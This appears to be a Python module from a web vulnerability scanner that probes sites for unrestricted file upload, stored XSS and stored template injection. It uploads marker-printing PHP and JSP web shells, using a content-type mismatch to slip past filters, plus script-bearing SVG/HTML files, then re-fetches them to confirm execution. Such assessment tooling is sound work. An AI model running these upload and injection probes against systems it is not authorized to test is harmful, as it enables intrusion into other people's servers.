"""Malicious create/upload — don't just create test data, create DANGEROUS data and confirm
impact by fetching it back.

Two probes, both evidence-gated and read-only in effect:

* malicious_upload_scan: upload a web shell (echoes a unique marker when executed) and an
  SVG/HTML carrying a script marker, then fetch the stored file. If the shell's marker comes
  back as *executed output* (not source) -> RCE via upload. If the SVG/HTML is served inline
  with its script intact -> stored XSS via upload.
* stored_injection_scan: submit a create form with a stored-XSS marker and an SSTI math
  probe, capture the created object, and re-fetch it. Raw (unencoded) marker -> stored XSS;
  the arithmetic evaluated (1787569) -> stored SSTI.

The shell only prints a marker; nothing destructive is run. Bounded and best-effort.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from urllib.parse import urljoin, urlsplit

from owlforge.engine.seed import _form_fields

_FILE_INPUT = re.compile(r'<input\b[^>]*type\s*=\s*["\']?file["\']?[^>]*>', re.I)
_NAME = re.compile(r'name\s*=\s*["\']?([\w\[\]-]+)', re.I)
_UPLOAD_DIRS = ("/uploads/", "/upload/", "/files/", "/media/", "/u/", "/images/", "/static/uploads/")


def _get(sandbox, url, headers):
    try:
        return sandbox.http_request("GET", url, headers=headers or {}) or {}
    except Exception:
        return {}


def _form_html(sandbox, url, headers):
    return _get(sandbox, url, headers).get("body", "") or ""


def _multipart(fields: dict, file_field: str, filename: str, content: str, ctype: str):
    b = "----owl" + secrets.token_hex(8)
    out = []
    for k, v in (fields or {}).items():
        out.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
    out.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{file_field}\"; "
               f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n{content}\r\n")
    out.append(f"--{b}--\r\n")
    return "".join(out), f"multipart/form-data; boundary={b}"


def _post_multipart(sandbox, url, body, ctype, headers):
    try:
        h = dict(headers or {})
        h["Content-Type"] = ctype
        return sandbox.http_request("POST", url, headers=h, body=body, follow_redirects=False) or {}
    except Exception:
        return {}


def _candidate_urls(resp: dict, upload_url: str, filename: str) -> list[str]:
    """Where might the uploaded file now live? Location, a URL in the body, or conventions."""
    urls, seen = [], set()

    def add(u):
        if u and u not in seen:
            seen.add(u)
            urls.append(u)

    hdrs = {k.lower(): v for k, v in (resp.get("headers") or {}).items()}
    if hdrs.get("location"):
        add(urljoin(upload_url, hdrs["location"]))
    body = resp.get("body", "") or ""
    for m in re.findall(r'["\'(]([^"\'()\s]+?' + re.escape(filename) + r')["\')]', body):
        add(urljoin(upload_url, m))
    for m in re.findall(r'["\'(]([^"\'()\s]*?(?:/uploads?/|/files?/|/media/)[^"\'()\s]+)', body, re.I):
        add(urljoin(upload_url, m))
    origin = f"{urlsplit(upload_url).scheme}://{urlsplit(upload_url).netloc}"
    for d in _UPLOAD_DIRS:
        add(origin + d + filename)
    return urls[:10]


def _find_upload_forms(inventory, sandbox, session_headers):
    out, seen = [], set()
    for it in inventory or []:
        if (it.get("method") or "GET").upper() != "POST" or it.get("source") not in ("form", "browser-form"):
            continue
        url = it.get("url", "")
        if not url or url in seen:
            continue
        seen.add(url)
        html = _form_html(sandbox, url, session_headers)
        fi = _FILE_INPUT.search(html)
        if not fi:
            continue
        nm = _NAME.search(fi.group(0))
        field = nm.group(1) if nm else "file"
        others = {k: v for k, v in _form_fields(html, url).items()}
        out.append((url, field, others))
    return out


def _file(assessment_id, title, severity, status, endpoint, analysis, poc, note, method="POST"):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id, title=title,
            severity=severity, status=status, confidence="high" if status == "validated" else "medium",
            endpoint=endpoint, method=method, technical_analysis=analysis, proof_of_concept=poc,
            impact="An attacker can store content the server later serves or executes for other "
                   "users.", remediation="Validate upload type/extension by allowlist, store "
            "uploads off the web root or on a separate origin, serve them with a safe "
            "Content-Type + Content-Disposition, and never execute user files.",
            validation_note=note))
        s.commit()


_SHELLS = (
    ("php", "<?php echo '{m}'; ?>", "application/x-php"),
    ("phtml", "<?php echo '{m}'; ?>", "image/jpeg"),      # content-type confusion
    ("php5", "<?php echo '{m}'; ?>", "application/x-php"),
    ("jsp", "<% out.print(\"{m}\"); %>", "application/octet-stream"),
)


def malicious_upload_scan(assessment_id, inventory, sandbox, session_headers,
                          log: Callable[[str], None] = lambda m: None, cap: int = 4) -> int:
    if sandbox is None:
        return 0
    forms = _find_upload_forms(inventory, sandbox, session_headers)
    if not forms:
        return 0
    filed = tested = 0
    for url, field, others in forms[:cap]:
        tested += 1
        # 1) web shell -> RCE if the marker comes back EXECUTED (not as source)
        for ext, tmpl, ctype in _SHELLS:
            marker = "OWLSHELL" + secrets.token_hex(4)
            fname = f"owl{secrets.token_hex(3)}.{ext}"
            content = tmpl.format(m=marker)
            body, ct = _multipart(others, field, fname, content, ctype)
            resp = _post_multipart(sandbox, url, body, ct, session_headers)
            hit = None
            for cu in _candidate_urls(resp, url, fname):
                r = _get(sandbox, cu, session_headers)
                b = r.get("body", "") or ""
                if marker in b and "<?php" not in b and "out.print" not in b:
                    hit = cu
                    break
            if hit:
                _file(assessment_id, "Unrestricted file upload to RCE (web shell executes)",
                      "critical", "validated", url,
                      f"A server-executable file uploaded via '{field}' ({fname}) is served at "
                      f"{hit} and EXECUTES: it returned the marker '{marker}' as output, not as "
                      "source. This is remote code execution via file upload.",
                      f"upload {fname} (prints a marker) -> GET {hit} -> executed output '{marker}'",
                      "reproduced: uploaded code executed server-side (read-only marker)")
                filed += 1
                break
        # 2) SVG/HTML stored XSS if served inline with the script intact
        for ext, ctype in (("svg", "image/svg+xml"), ("html", "text/html")):
            xm = "OWLXSS" + secrets.token_hex(4)
            fname = f"owl{secrets.token_hex(3)}.{ext}"
            content = (f'<svg xmlns="http://www.w3.org/2000/svg"><script>/*{xm}*/</script></svg>'
                       if ext == "svg" else f"<html><script>/*{xm}*/</script></html>")
            body, ct = _multipart(others, field, fname, content, ctype)
            resp = _post_multipart(sandbox, url, body, ct, session_headers)
            for cu in _candidate_urls(resp, url, fname):
                r = _get(sandbox, cu, session_headers)
                rct = str((r.get("headers") or {}).get("content-type")
                          or (r.get("headers") or {}).get("Content-Type") or "").lower()
                if xm in (r.get("body", "") or "") and ("svg" in rct or "html" in rct):
                    _file(assessment_id, "Stored XSS via file upload (script served inline)",
                          "high", "candidate", url,
                          f"An {ext.upper()} carrying a script was uploaded via '{field}' and is "
                          f"served inline from {cu} with Content-Type {rct}, so its script runs in "
                          "a victim's browser.",
                          f"upload {fname} with inline script -> GET {cu} ({rct}) serves it",
                          "candidate: script-bearing upload served inline — confirm execution")
                    filed += 1
                    break
            else:
                continue
            break
    if filed:
        log(f"malicious-upload: {filed} finding(s) on {tested} upload form(s)")
    elif tested:
        log(f"malicious-upload: uploads look restricted on {tested} form(s)")
    return filed


_SSTI = "{{1337*1337}}"
_SSTI_HIT = "1787569"


def stored_injection_scan(assessment_id, inventory, sandbox, session_headers,
                          log: Callable[[str], None] = lambda m: None, cap: int = 6) -> int:
    """Submit create forms with a stored-XSS marker + an SSTI probe, re-fetch the created
    object, and flag raw reflection (stored XSS) or evaluation (stored SSTI)."""
    if sandbox is None or not session_headers:
        return 0
    from urllib.parse import urlencode
    _CREATE = ("create", "/new", "/add", "/post", "comment", "note", "topic", "article",
               "project", "message", "/save")
    filed = tested = 0
    seen = set()
    for it in inventory or []:
        if (it.get("method") or "GET").upper() != "POST" or it.get("source") not in ("form", "browser-form"):
            continue
        url = it.get("url", "")
        low = url.lower()
        if not url or url in seen or any(h in low for h in ("login", "logout", "register", "signup")):
            continue
        if not any(h in low for h in _CREATE) and not it.get("params"):
            continue
        seen.add(url)
        html = _form_html(sandbox, url, session_headers)
        fields = _form_fields(html, url)
        if _FILE_INPUT.search(html) or not fields:
            continue
        tested += 1
        xm = "owlX" + secrets.token_hex(4)
        payload = f"<{xm}>{_SSTI}"
        for name in list(fields):
            n = name.lower()
            if "csrf" in n or "token" in n:
                continue
            if not fields[name] or any(k in n for k in ("title", "name", "body", "content",
                                                        "text", "comment", "message", "description")):
                fields[name] = payload
        h = dict(session_headers)
        h["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            resp = sandbox.http_request("POST", url, headers=h, body=urlencode(fields),
                                        follow_redirects=False) or {}
        except Exception:
            continue
        # where to look: the create response, its redirect target, and the form page itself
        bodies = [resp.get("body", "") or ""]
        loc = (resp.get("headers") or {}).get("location") or (resp.get("headers") or {}).get("Location")
        if loc:
            bodies.append(_get(sandbox, urljoin(url, loc), session_headers).get("body", "") or "")
        bodies.append(_get(sandbox, url, session_headers).get("body", "") or "")
        blob = "\n".join(bodies)
        if _SSTI_HIT in blob:
            _file(assessment_id, "Stored server-side template injection (SSTI)", "high",
                  "validated", url,
                  f"A template expression stored via {url} was evaluated server-side: "
                  f"{_SSTI} rendered as {_SSTI_HIT} when the object was viewed.",
                  f"store {_SSTI} -> rendered {_SSTI_HIT}", "reproduced: stored template evaluated",
                  method="POST")
            filed += 1
        elif f"<{xm}>" in blob:
            _file(assessment_id, "Stored XSS (persisted, unencoded)", "high", "candidate", url,
                  f"Content stored via {url} is reflected UNENCODED when viewed (the raw marker "
                  f"<{xm}> appears), so a script stored here runs in other users' browsers.",
                  f"store <{xm}>… -> raw reflection on view", "candidate: stored raw reflection "
                  "— confirm script execution in a browser", method="POST")
            filed += 1
    if filed:
        log(f"stored-injection: {filed} stored XSS/SSTI finding(s) via create forms")
    return filed
